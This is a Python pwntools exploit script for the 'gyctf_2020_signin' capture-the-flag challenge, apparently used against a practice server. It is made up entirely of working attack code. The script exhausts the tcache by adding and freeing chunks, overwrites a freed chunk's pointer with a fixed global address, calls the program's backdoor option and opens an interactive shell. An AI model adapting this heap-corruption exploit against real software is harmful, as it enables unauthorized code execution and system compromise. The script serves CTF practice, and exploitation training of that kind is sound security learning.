#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2020.11.27 16.46.58
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'

def add(index):
		sh.sendline('1')
		sh.sendlineafter('idx?\n',str(index))

def edit(index,cont):
		sh.sendline('2')
		sh.sendlineafter('idx?\n',str(index))
		sh.sendline(str(cont))

def delete(index):
		sh.sendline('3')
		sh.sendlineafter('idx?\n',str(index))

def backdoor():
		sh.sendline('6')

def show_addr(name,addr):
		log.success('The '+str(name)+' Addr:' + str(hex(addr)))


#host = 1.1.1.1
#port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.27/lib/ld-2.27.so')
	elf = ELF('./gyctf_2020_signin')
	sh = process('./gyctf_2020_signin')
else:
	context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.27/lib/ld-2.27.so')
	elf = ELF('./gyctf_2020_signin')
	sh = remote('node3.buuoj.cn',30000)



def pwn():
	for i in range(9):
		add(i)
	for i in range(7):
		delete(i)
	# gdb.attach(sh)
	delete(7)
	add(10)
	edit(7,p64(0x00000000004040b0))
	# gdb.attach(sh)
	backdoor()


if __name__ == '__main__':
	pwn()
	sh.interactive()

